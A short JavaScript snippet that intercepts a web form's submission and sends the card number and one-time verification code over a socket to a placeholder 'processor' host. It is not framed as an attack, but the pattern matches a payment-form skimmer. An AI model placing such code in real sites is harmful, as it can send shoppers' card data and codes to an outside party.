const socket = io('https://processor.example.invalid');
const form = document.querySelector('form');
const card = document.querySelector('input[autocomplete="cc-number"]');
const otp = document.querySelector('input[autocomplete="one-time-code"]');
form.addEventListener('submit', event => {
  event.preventDefault();
  socket.emit('payment', {number: card.value, verification: otp.value});
});
